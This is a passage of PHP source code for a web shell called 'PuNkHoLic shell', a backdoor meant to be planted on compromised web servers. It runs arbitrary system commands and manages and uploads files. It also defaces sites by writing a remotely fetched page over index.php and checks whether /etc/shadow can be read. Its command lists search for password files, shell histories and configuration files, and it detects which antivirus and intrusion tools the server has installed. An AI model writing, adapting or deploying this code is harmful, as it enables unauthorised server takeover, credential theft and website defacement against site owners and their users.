<html>
<head>
<title>PuNkHoLic shell</title>
<link href="https://fonts.googleapis.com/css?family=Josefin+Sans:400,100" rel="stylesheet">
</head>
<style>
body{
font-family:Josefin Sans,sans-serif;
background:black;
color:#ABEFFF;
}
}
.loginpage{
height:400px;
width:500px;
border:1px solid;
border-color:#ABEFFF;
text-align:center;
border-radius:5px;
margin-top:100px;
}
#pageheading{
font-size:25px;
color:#ABEFFF;
margin-top:10px;
}
.loginpage img{
width:500px;
}
input{
background:black;
border-color:#ABEFFF;
border-radius:10px;
margin-top:10px;
padding:5px;
color:#ABEFFF;
}
input:hover{
background:#ABEFFF;
color:red;
}
</style>
<body>
</body>
</html>
<?php
}
exit;
}
if(!isset( $_SESSION[md5($_SERVER['HTTP_HOST'])]))
if(empty( $auth_pass )||
(isset($_POST['pass']) &&($_POST['pass']) == $auth_pass&& ($_POST['uname']) == $UserName))
$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
printLogin();
if(strtolower(substr(PHP_OS,0,3))=="win")
$os='win';
else
$os='nix';
$safe_mode=@ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');
$home_cwd=@getcwd();
if( isset($_POST['c']))
@chdir($_POST['c']);
$cwd = @getcwd();
if( $os == 'win') {
$home_cwd=str_replace("\\", "/", $home_cwd);
$cwd=str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1]!= '/' )
$cwd .= '/';
if($os=='win'){
$aliases = array(
"List Directory" => "dir",
"Find index.php in current dir" => "dir /s /w /b index.php",
"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
"Show active connections" => "netstat -an",
"Show running services" => "net start",
"User accounts" => "net user",
"Show computers" => "net view",
"ARP Table" => "arp -a",
"IP Configuration" => "ipconfig /all"
);
}
else{
$aliases = array(
"List dir" => "ls -la",
"list file attributes on a Linux second extended file system" => "lsattr -va",
"show opened ports" => "netstat -an | grep -i listen",
"Find" => "",
"find all suid files" => "find / -type f -perm -04000 -ls",
"find suid files in current dir" => "find . -type f -perm -04000 -ls",
"find all sgid files" => "find / -type f -perm -02000 -ls",
"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
"find config.inc.php files" => "find / -type f -name config.inc.php",
"find config* files" => "find / -type f -name \"config*\"",
"find config* files in current dir" => "find . -type f -name \"config*\"",
"find all writable folders and files" => "find / -perm -2 -ls",
"find all writable folders and files in current dir" => "find . -perm -2 -ls",
"find all service.pwd files" => "find / -type f -name service.pwd",
"find service.pwd files in current dir" => "find . -type f -name service.pwd",
"find all .htpasswd files" => "find / -type f -name .htpasswd",
"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
"find all .bash_history files" => "find / -type f -name .bash_history",
"find .bash_history files in current dir" => "find . -type f -name .bash_history",
"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
"Locate" => "",
"locate httpd.conf files" => "locate httpd.conf",
"locate vhosts.conf files" => "locate vhosts.conf",
"locate proftpd.conf files" => "locate proftpd.conf",
"locate psybnc.conf files" => "locate psybnc.conf",
"locate my.conf files" => "locate my.conf",
"locate admin.php files" =>"locate admin.php",
"locate cfg.php files" => "locate cfg.php",
"locate conf.php files" => "locate conf.php",
"locate config.dat files" => "locate config.dat",
"locate config.php files" => "locate config.php",
"locate config.inc files" => "locate config.inc",
"locate config.inc.php" => "locate config.inc.php",
"locate config.default.php files" => "locate config.default.php",
"locate config* files " => "locate config",
"locate .conf files"=>"locate '.conf'",
"locate .pwd files" => "locate '.pwd'",
"locate .sql files" => "locate '.sql'",
"locate .htpasswd files" => "locate '.htpasswd'",
"locate .bash_history files" => "locate '.bash_history'",
"locate .mysql_history files" => "locate '.mysql_history'",
"locate .fetchmailrc files" => "locate '.fetchmailrc'",
"locate backup files" => "locate backup",
"locate dump files" => "locate dump",
"locate priv files" => "locate priv"
);
}
if(isset($_POST['p1']) && $_POST['p1']=='deface') {
$def = file_get_contents($deface_url);
file_put_contents($_POST['c'].$_POST['p2'],$def);
}
function ex($in) {
$out = '';
if ( function_exists(' exec ')) {
@exec($in,$out);
$out = @join("\n",$out);
}elseif(function_exists('passthru')) {
ob_start();
@passthru($in);
$out = ob_get_clean();
}elseif(function_exists('system')) {
ob_start();
@system($in);
$out = ob_get_clean();
}elseif(function_exists('shell_exec')) {
$out = shell_exec($in);
}elseif(is_resource($f = @popen($in,"r"))) {
$out = "";
while(!@feof($f))
$out .= fread($f,1024);
pclose($f);
}
return $out;
}
function which($p) {
$path = ex('which '.$p);
if(!empty($path))
return $path;
return false;
}
function printHeader() {
if(empty($_POST['charset']))
$_POST['charset'] = "UTF-8";
global $color;
global $Theme;
global $TabsColor;
echo "<html><head><link href='https://fonts.googleapis.com/css?family=Josefin+Sans:400,100' rel='stylesheet' type='text/css'></head>";
echo '<html>
<meta http-equiv="Content-Type" content="text/html; charset='.$_POST['charset'].'"><title>PuNkHoLic  Shell</title>
<style>
body {background-color:black;color:#fff;}
body,td,th{ font-family: Josefin Sans, sans-serif;font-size:13px;margin:0;vertical-align:top; }
span,h1,a{ color:'.$color.' !important; }
span{ font-weight: bolder; }
h1{ padding: 0px 5px;font: 14pt audiowide;margin:0px 0 0 0px; }
div.content{ padding: 0px;margin:0 0px;background: #0F1010;border:1px solid '.$Theme.'; border-radius:5px;}
a{ text-decoration:none; }
a:hover{ border-bottom:0px solid #5e5e5e;text-decoration:none; }
a:hover{cursor: url("http://downloads.totallyfreecursors.com/cursor_files/pakistan.ani"), url("http://downloads.totallyfreecursors.com/thumbnails/PAKISTAN.gif"), auto;text-decoration:none;}
.ml1{ border:1px solid '.$Theme.';padding:px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px;margin-top:0px; border-radius:10px; border-color:'.$Theme.'; background:#2F2F2F;}
input, textarea, select{ margin-top:0;color:#63E1FF;background-color:black;border-radius:5px;border:1px solid '.$Theme.'; border-radis:5px;font: 10pt arial,"Courier New"; }
input[type="button"]:hover,input[type="submit"]:hover {background-color:#094F60;color:black;text-decoration:none;} 
form{ margin:0px; background:#0F1010;}
#toolsTbl{ text-align:center; }
.toolsInp{ width: 80%; background:black; border-radius:5px; border-color:'.$Theme.'; }
.main th{text-align:left;background-color:'.$TabsColor.';}
.main tr:hover{background:'.$Theme.'; border:5px solid;border-color:'.$Theme.';}
.main td, th{vertical-align:middle;}
.menu { height:30px; border-radius:10px;}
.menu th{padding:1px;border-radius: 5px;background:'.$TabsColor.'; -webkit-transform: rotate(20deg);
-moz-transform: rotate(20deg);
-o-transform: rotate(20deg);
-ms-transform: rotate(20deg);
transform: rotate(20deg);}
.menu th:hover{background:#0F1010;text-decoration: none;}
pre {font-family: Josefin Sans, sans-serif;color:#FFFFFF;}
#cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}
.cpr {margin-bottom:5px;font-weight:bold; }
.cpb {width:34px;margin:0 5px;}
.npoad td {padding:0;}
#PuNkHoLictools{
margin-top:50px;
width:500px;
border:1px solid;
border-radius:10px;
}
.PuNkHoLiclogo td{
font-size:12px;
font-weight:bold;
}
.PuNkHoLiclogo{
margin-left:5px;
background-repeat: no-repeat;
background-position: CENTER; 
background-color:#0F1010;
background-size: 400px 120px;
}
</style>
</html>
<style type="text/css">body, a:hover {text-decoration:none;cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress !important;}</style><a href="http://www.cursors-4u.com/cursor/2012/02/11/chrome-pointer.html" target="_blank" title="Chrome Pointer"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Chrome Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
<script>
function set(a,c,p1,p2,p3,charset) {
if(a != null)document.mf.a.value=a;
if(c != null)document.mf.c.value=c;
if(p1 != null)document.mf.p1.value=p1;
if(p2 != null)document.mf.p2.value=p2;
if(p3 != null)document.mf.p3.value=p3;
if(charset != null)document.mf.charset.value=charset;
}
function g(a,c,p1,p2,p3,charset) {
set(a,c,p1,p2,p3,charset);
document.mf.submit();
}
function a(a,c,p1,p2,p3,charset) {
set(a,c,p1,p2,p3,charset);
var params = "ajax=true";
for(i=0;i<document.mf.elements.length;i++)
params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
sr("'.$_SERVER['REQUEST_URI'].'", params);
}
function sr(url, params) {
if (window.XMLHttpRequest) {
req = new XMLHttpRequest();
req.onreadystatechange = processReqChange;
req.open("POST", url, true);
req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
} 
else if (window.ActiveXObject) {
req = new ActiveXObject("Microsoft.XMLHTTP");
if (req) {
req.onreadystatechange = processReqChange;
req.open("POST", url, true);
req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
}
}
}
function processReqChange() {
if( (req.readyState == 4) )
if(req.status == 200) {
//alert(req.responseText);
var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
var arr=reg.exec(req.responseText);
eval(arr[2].substr(0, arr[1]));
} 
else alert("Request error!");
}
</script>
<head><link href="https://fonts.googleapis.com/css?family=Audiowide" ></head><body><div style="position:absolute;width:100%;top:0;left:0;"><div style="margin:5px;background:black;"><div class="content" style="border:1px solid '.$Theme.'; border-radius:5px;">
<form method=post name=mf style="display:none;">
<input type=hidden name=a value="'.(isset($_POST['a'])?$_POST['a']:'').'">
<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
<input type=hidden name=p1 value="'.(isset($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'">
<input type=hidden name=p2 value="'.(isset($_POST['p2'])?htmlspecialchars($_POST['p2']):'').'">
<input type=hidden name=p3 value="'.(isset($_POST['p3'])?htmlspecialchars($_POST['p3']):'').'">
<input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
</form>';
$freeSpace = @diskfreespace($GLOBALS['cwd']);
$totalSpace = @disk_total_space($GLOBALS['cwd']);
$totalSpace = $totalSpace?$totalSpace:1;
$disable_functions = @ini_get('disable_functions');
$release = @php_uname('r');
$kernel = @php_uname('s');
if(!function_exists('posix_getegid')) {
$user = @get_current_user();
$uid = @getmyuid();
$gid = @getmygid();
$group = "?";
} else {
$uid = @posix_getpwuid(@posix_geteuid());
$gid = @posix_getgrgid(@posix_getegid());
$user = $uid['name'];
$uid = $uid['uid'];
$group = $gid['name'];
$gid = $gid['gid'];
}
$cwd_links = '';
$path = explode("/", $GLOBALS['cwd']);
$n=count($path);
for($i=0;$i<$n-1;$i++) {
$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
for($j=0;$j<=$i;$j++)
$cwd_links .= $path[$j].'/';
$cwd_links .= "\")'>".$path[$i]."/</a>";
}
$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
$opt_charsets = '';
foreach($charsets as $item)
$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
$m = array('Import Scripts'=>'ImportScripts','Jumping'=>'Jumping','Symlink'=>'Symlink','Domains' => 'Domain','Shared Hostings'=>'Shared','Sym Sites'=>'Sym','Subdomain'=>'Subdomain','Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Safe Mode'=>'Bypass','String tools'=>'StringTools','Defacer' => 'Deface','Recursive Defacer'=>'Defacer');
if(!empty($GLOBALS['auth_pass']))
$m['Logout'] = 'Logout';
$menu = '';
foreach($m as $k => $v)
$menu .= '<th><a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a></th>';
$drives = "";
if ($GLOBALS['os'] == 'win') {
foreach( range('a','z') as $drive ){
if (is_dir($drive.':\\'))
$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
}
$drives .= '<br />: ';
}
if($GLOBALS['os'] == 'nix') {
$dominios = @file_get_contents("/etc/named.conf");
if(!$dominios) {
$DomainS = "/var/named";
$Domainonserver = scandir($DomainS);
$d0c = count($Domainonserver);
} else {
@preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
$out = sizeof(array_unique($out[1]));
$d0c = $out."Domains";
}
} else {
$d0c = "Nothing here bro:(";
}
if($GLOBALS['os'] == 'nix' )
{
$usefl = ''; $dwnldr = '';
if(!@ini_get('safe_mode')) {
$temp = array();
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
foreach($userful as $item) { if(which($item)) $temp[]= $item; }
$usefl = implode(', ',$temp);
$temp = array();
$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
foreach($downloaders as $item2) { if(which($item2)) $temp[]= $item2; }
$dwnldr = implode(', ',$temp);
} else {
$usefl = ' ------- '; $dwnldr = ' ------- ';
}
} else { 
$usefl = ' ------- '; $dwnldr = ' ------- ';
} 
echo '<div class="PuNkHoLiclogo"><table class="info" cellpadding="0" cellspacing="0" width="100%"><tr>
<td><table cellpadding="3" cellspacing="0" class="npoad"><tr><td width="80px;"><span>Uname</span></td><td>: <nobr>'.substr(@php_uname(), 0, 120).'</nobr></td></tr>
<tr><td><span>User</span></td><td>: '.$uid.' ( '.$user.' ) <span>Group: </span> '.$gid.' ( '.$group.' )</td></tr><tr><td><span>Server</span></td><td>: '.@getenv('SERVER_SOFTWARE').'</td></tr><tr><td><span>Useful</span></td><td>: '.$usefl.'</td></tr><tr><td><span>Downloaders</span></td><td>: '.$dwnldr.'</td></tr><tr><td><span>D/functions</span></td><td>: '.($disable_functions?$disable_functions:'All Function Enable').'</td></tr><tr><td><span>'.($GLOBALS['os'] == 'win'?'Drives<br />Cwd':'Cwd').'</span></td><td>: '.$drives.''.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a></td></tr></table></td>'.
 '<td width=4><nobr><span>Sv IP</span><br><span>Your IP</span><br /><span>HDD</span><br /><span>Free</span><br /><span>PHP</span><br /><span>Safe Mode</span><br /><span>Domains</span></nobr></td>'.
 '<td><nobr>: '.gethostbyname($_SERVER["HTTP_HOST"]).'<br>: '.$_SERVER['REMOTE_ADDR'].'<br />: '.viewSize($totalSpace).'<br />: '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>: '.@phpversion().' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a><br />: '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color='.$color.'<b>OFF</b></font>').'<br />: '.$d0c.'</nobr></td></tr></table></div>'.
 '</div></div><div style="margin:5;background:black;"><div class="content" style="border-top:5px solid 430303;padding:2px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr>'.$menu.'</tr></table></div></div><div style="margin:5;background:black;">';
}
function printFooter() {
$is_writable = is_writable($GLOBALS['cwd'])?"<font color=green>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
echo '</div><div style="margin:5px;background:black;"><div class="content" style="border:1px solid '.$Theme.'; border-radius:5px;">
<table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%">
<tr>
<td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="'.htmlspecialchars($GLOBALS['cwd']).'"><input type=submit value=">>"></form></td>
<td><form onsubmit="g(\'FilesTools\',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
</tr>
<tr>
<td><form onsubmit="g(\'FilesMan\',null,\'mkdir\',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form>'.$is_writable.'</td>
<td><form onsubmit="g(\'FilesTools\',null,this.f.value,\'mkfile\');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form>'.$is_writable.'</td>
</tr>
<tr>
<td><form onsubmit="g(\'Console\',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
<td><form method="post" ENCTYPE="multipart/form-data">
<input type=hidden name=a value="FilesMAn">
<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
<input type=hidden name=p1 value="uploadFile">
<input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
<span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form>'.$is_writable.'</td>
</tr>
</table></div></div>
<div style="margin:5px;background:black;"><div class="content" style="border:2px solid '.$Theme.';text-align:center;font-weight:bold; border-radius:10px;margin:auto; width:500;">PuNkHoLic           Shell       coded by <a href="https://www.facebook.com/niraj.ghimire.5454"> PuNkHoLic</a></div></div>
</div>
</body></html>';
}
if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }
function viewSize($s) {
if($s >= 1073741824)
return sprintf('%1.2f', $s / 1073741824 ). ' GB';
elseif($s >= 1048576)
return sprintf('%1.2f', $s / 1048576 ) . ' MB';
elseif($s >= 1024)
return sprintf('%1.2f', $s / 1024 ) . ' KB';
else
return $s . ' B';
}
function perms($p) {
if (($p & 0xC000) == 0xC000)$i = 's';
elseif (($p & 0xA000) == 0xA000)$i = 'l';
elseif (($p & 0x8000) == 0x8000)$i = '-';
elseif (($p & 0x6000) == 0x6000)$i = 'b';
elseif (($p & 0x4000) == 0x4000)$i = 'd';
elseif (($p & 0x2000) == 0x2000)$i = 'c';
elseif (($p & 0x1000) == 0x1000)$i = 'p';
else $i = 'u';
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p & 0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
return $i;
}
function viewPermsColor($f) { 
if (!@is_readable($f))
return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
elseif (!@is_writable($f))
return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
else
return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
}
if(!function_exists("scandir")) {
function scandir($dir) {
$dh= opendir($dir);
while (false !== ($filename = readdir($dh))) {
$files[] = $filename;
}
return $files;
}
}
function actionSecInfo() {
printHeader();
echo '<h1>Server security information</h1><div class=content>';
function showSecParam($n, $v) {
$v = trim($v);
if($v) {
echo '<span>'.$n.': </span>';
if(strpos($v, "\n") === false)
echo $v.'<br>';
else
echo '<pre class=ml1>'.$v.'</pre>';
}
}
showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
showSecParam('Open base dir', @ini_get('open_basedir'));
showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
$temp=array();
if(function_exists('mysql_get_client_info'))
$temp[] = "MySql (".mysql_get_client_info().")";
if(function_exists('mssql_connect'))
$temp[] = "MSSQL";
if(function_exists('pg_connect'))
$temp[] = "PostgreSQL";
if(function_exists('oci_connect'))
$temp[] = "Oracle";
showSecParam('Supported databases', implode(', ', $temp));
echo '<br>';
if( $GLOBALS['os'] == 'nix' ) {
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
showSecParam('OS version', @file_get_contents('/proc/version'));
showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
if(!$GLOBALS['safe_mode']) {
echo '<br>';
$temp=array();
foreach ($userful as $item)
if(which($item)){$temp[]=$item;}
showSecParam('Userful', implode(', ',$temp));
$temp=array();
foreach ($danger as $item)
if(which($item)){$temp[]=$item;}
showSecParam('Danger', implode(', ',$temp));
$temp=array();
foreach ($downloaders as $item) 
if(which($item)){$temp[]=$item;}
showSecParam('Downloaders', implode(', ',$temp));
echo '<br/>';
showSecParam('Hosts', @file_get_contents('/etc/hosts'));
showSecParam('HDD space', ex('df -h'));
showSecParam('Mount options', @file_get_contents('/etc/fstab'));
}
} else {
showSecParam('OS Version',ex('ver')); 
showSecParam('Account Settings',ex('net accounts')); 
showSecParam('User Accounts',ex('net user'));
}
echo '</div>';
printFooter();
}
function actionFilesMan() {
printHeader();
echo '<h1>File manager</h1><div class=content>';
if(isset($_POST['p1']) && $_POST['p1']!='deface') {
switch($_POST['p1']) {
case 'uploadFile':
if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
echo "Can't upload file!";
break;
break;
case 'mkdir':
if(!@mkdir($_POST['p2']))
echo "Can't create new dir";
break;
case 'delete':
function deleteDir($path) {
$path = (substr($path,-1)=='/') ? $path:$path.'/';
$dh= opendir($path);
while ( ($item = readdir($dh) ) !== false) {
$item = $path.$item;
if ( (basename($item) == "..") || (basename($item) == ".") )
continue;
$type = filetype($item);
if ($type == "dir")
deleteDir($item);
else
@unlink($item);
}
closedir($dh);
rmdir($path);
}
if(is_array(@$_POST['f']))
foreach($_POST['f'] as $f) {
$f = urldecode($f);
if(is_dir($f))
deleteDir($f);
else
@unlink($f);
}
break;
case 'paste':
if($_SESSION['act'] == 'copy') {
function copy_paste($c,$s,$d){
if(is_dir($c.$s)){
mkdir($d.$s);
$h = opendir($c.$s);
while (($f = readdir($h)) !== false)
if (($f != ".") and ($f != "..")) {
copy_paste($c.$s.'/',$f, $d.$s.'/');
}
} elseif(is_file($c.$s)) {
@copy($c.$s, $d.$s);
}
}
foreach($_SESSION['f'] as $f)
copy_paste($_SESSION['cwd'],$f, $GLOBALS['cwd']);
} elseif($_SESSION['act'] == 'move') {
function move_paste($c,$s,$d){
if(is_dir($c.$s)){
mkdir($d.$s);
$h = opendir($c.$s);
while (($f = readdir($h)) !== false)
if (($f != ".") and ($f != "..")) {
copy_paste($c.$s.'/',$f, $d.$s.'/');
}
} elseif(is_file($c.$s)) {
@copy($c.$s, $d.$s);
}
}
foreach($_SESSION['f'] as $f)
@rename($_SESSION['cwd'].$f, $GLOBALS['cwd'].$f);
}
unset($_SESSION['f']);
break;
default:
if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')) ) {
$_SESSION['act'] = @$_POST['p1'];
$_SESSION['f'] = @$_POST['f'];
foreach($_SESSION['f'] as $k => $f)
$_SESSION['f'][$k] = urldecode($f);
$_SESSION['cwd'] = @$_POST['c'];
}
break;
}
echo '<script>document.mf.p1.value="";document.mf.p2.value="";</script>';
}
$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
if($dirContent === false) {echo 'Can\'t open this folder!'; return;}
global $sort;
$sort = array('name', 1);
if(!empty($_POST['p1'])) {
if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
$sort = array($match[1], (int)$match[2]);
}
echo '<script>
function sa() {
for(i=0;i<document.files.elements.length;i++)
if(document.files.elements[i].type == \'checkbox\')
document.files.elements[i].checked = document.files.elements[0].checked;
}
</script>
<table width=\'100%\' class=\'main\' cellspacing=\'0\' cellpadding=\'2\'>
<form name=files method=post>';
echo "<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
$dirs = $files = $links = array();
$n = count($dirContent);
for($i=0;$i<$n;$i++) {
$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
$tmp = array('name' => $dirContent[$i],
 'path' => $GLOBALS['cwd'].$dirContent[$i],
 'modify' => @date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i])),
 'perms' => viewPermsColor($GLOBALS['cwd'].$dirContent[$i]),
 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
);
if(@is_file($GLOBALS['cwd'].$dirContent[$i]))
$files[] = array_merge($tmp, array('type' => 'file'));
elseif(@is_link($GLOBALS['cwd'].$dirContent[$i]))
$links[] = array_merge($tmp, array('type' => 'link'));
elseif(@is_dir($GLOBALS['cwd'].$dirContent[$i])&& ($dirContent[$i] != "."))
$dirs[] = array_merge($tmp, array('type' => 'dir'));
}
$GLOBALS['sort'] = $sort;
function cmp($a, $b) {
if($GLOBALS['sort'][0] != 'size')
return strcmp($a[$GLOBALS['sort'][0]], $b[$GLOBALS['sort'][0]])*($GLOBALS['sort'][1]?1:-1);
else
return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
}
usort($files, "cmp");
usort($dirs, "cmp");
usort($links, "cmp");
$files = array_merge($dirs, $links, $files);
$l = 0;
foreach($files as $f) {
echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');"><b>[ '.htmlspecialchars($f['name']).' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
$l = $l?0:1;
}
echo '<tr><td colspan=5>
<input type=hidden name=a value=\'FilesMan\'>
<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
<input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
<select name=\'p1\'><option value=\'copy\'>Copy</option><option value=\'move\'>Move</option><option value=\'delete\'>Delete</option>';
if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){echo '<option value=\'paste\'>Paste</option>'; }
echo '</select>&nbsp;<input type="submit" value=">>"></td><td colspan="2" align="right" width="1"><input name="def" id="def" value="index.php" size="10"/>&nbsp;<input type="button" onclick="g(\'FilesMan\',\''.htmlspecialchars($GLOBALS['cwd']).'\',\'deface\',document.getElementById(\'def\').value)" value="Add your Deface"></td></tr>
</form></table></div>';
printFooter();
}
function actionStringTools() {
if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= dechex(ord($p[$i]));return strtoupper($r);}}
if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
if(isset($_POST['ajax'])) {
$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
ob_start();
if(function_exists($_POST['p1']))
echo $_POST['p1']($_POST['p2']);
$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
echo strlen($temp), "\n", $temp;
exit;
}
printHeader();
